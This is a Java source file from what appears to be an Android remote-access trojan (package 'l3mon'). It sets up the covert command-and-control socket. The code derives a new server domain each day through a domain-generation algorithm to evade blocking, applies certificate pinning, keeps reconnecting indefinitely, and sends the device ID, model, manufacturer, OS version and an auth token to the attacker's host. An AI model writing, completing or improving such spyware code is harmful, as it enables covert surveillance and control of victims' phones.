package com.etechd.l3mon;

import android.os.Build;
import android.provider.Settings;
import java.net.URISyntaxException;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import com.etechd.l3mon.managers.AuthManager;
import com.etechd.l3mon.managers.DGAManager;
import io.socket.client.IO;
import io.socket.client.Socket;
import okhttp3.CertificatePinner;
import okhttp3.OkHttpClient;

public class IOSocket {
    private static IOSocket ourInstance = new IOSocket();
    private io.socket.client.Socket ioSocket;

    private IOSocket() {
        try {
            String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
            
            // 1. DGA: Gera o domínio para o dia atual
            String dynamicDomain = DGAManager.getCurrentDayDomain();

            // 2. Configurar SSL Pinning para o domínio dinâmico
            CertificatePinner certPinner = new CertificatePinner.Builder()
                    .add(dynamicDomain, "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
                    .build();

            OkHttpClient okHttpClient = new OkHttpClient.Builder()
                    .certificatePinner(certPinner)
                    .build();

            IO.Options opts = new IO.Options();
            opts.callFactory = okHttpClient;
            opts.webSocketFactory = okHttpClient;
            opts.reconnection = true;
            opts.reconnectionDelay = 5000;
            opts.reconnectionDelayMax = 999999999;

            // Injeta Token JWT se existir
            AuthManager auth = new AuthManager(MainService.getContextOfApplication());
            String token = auth.getToken();
            String queryParams = "?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID;
            
            if (token != null) {
                queryParams += "&token=" + token;
                opts.extraHeaders = Collections.singletonMap("Authorization", 
                    Collections.singletonList("Bearer " + token));
            }

            ioSocket = IO.socket("https://" + dynamicDomain + ":22222" + queryParams, opts);
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }


    public static IOSocket getInstance() {
        return ourInstance;
    }

    public Socket getIoSocket() {
        return ioSocket;
    }




}
